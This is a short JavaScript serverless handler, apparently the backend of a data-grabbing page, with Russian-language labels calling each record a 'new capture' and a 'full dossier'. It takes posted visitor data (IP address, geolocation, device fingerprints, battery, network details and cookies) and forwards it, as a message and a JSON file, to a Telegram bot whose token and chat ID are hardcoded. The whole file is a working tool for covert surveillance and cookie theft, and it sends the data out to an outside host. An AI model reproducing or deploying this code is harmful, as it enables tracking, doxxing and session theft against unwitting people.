export default async function handler(req, res) {
    if (req.method !== "POST") return res.status(405).end();
    const data = req.body;
    const BOT_TOKEN = "8766394398:AAHuiigCpIiMoDhh2pz5YsNcmpEQTCvJtxc";
    const CHAT_ID = "8510274209";
    const text = [
        "💀 **НОВЫЙ ЗАХВАТ**",
        `📍 **IP:** \`${data.ip || "неизв"}\``,
        `🌍 **Гео:** ${data.geo ? `${data.geo.lat.toFixed(4)}, ${data.geo.lon.toFixed(4)}` : "нет"}`,
        `📱 **Устройство:** ${data.userAgent}`,
        `🖥 **Экран:** ${data.screen} (${data.orientation})`,
        `🔋 **Батарея:** ${data.battery}`,
        `📶 **Сеть:** ${data.network}`,
        `🧠 **CPU:** ${data.hardwareConcurrency} | RAM: ${data.deviceMemory || "?"} ГБ`,
        `🍪 **Cookies:** ${data.cookies}`,
        `🎨 **Canvas:** ${data.canvas ? data.canvas.substring(0,40)+"..." : "нет"}`,
        `🖼 **WebGL:** ${data.webgl || "нет"}`
    ].join("\n");
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST", headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown", disable_web_page_preview: true })
        });
        const jsonStr = JSON.stringify(data, null, 2);
        const blob = new Blob([jsonStr], { type: "application/json" });
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("document", blob, `dossier_${data.ip || "unknown"}.json`);
        form.append("caption", `📁 Полное досье (${data.ip || "неизв"})`);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: form });
    } catch (e) { console.error(e); }
    res.status(200).json({ status: "ok" });
}